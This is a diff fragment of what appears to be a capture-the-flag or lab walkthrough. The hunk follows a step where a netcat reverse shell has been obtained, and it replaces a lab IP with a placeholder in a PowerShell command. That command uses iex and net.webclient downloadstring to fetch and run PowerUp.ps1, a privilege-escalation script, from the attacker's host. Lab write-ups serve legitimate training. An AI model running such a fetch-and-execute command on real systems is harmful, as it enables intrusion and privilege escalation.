@@ -134,7 +134,7 @@ You now have a shell on your netcat listener.
 
 Next type in the following to your shell:
 
-iex(new-object net.webclient).downloadstring("http://10.10.16.2/PowerUp.ps1")
+iex(new-object net.webclient).downloadstring("http://YOUR_LOCAL_IP/PowerUp.ps1")
 
 this will give the following output:
 
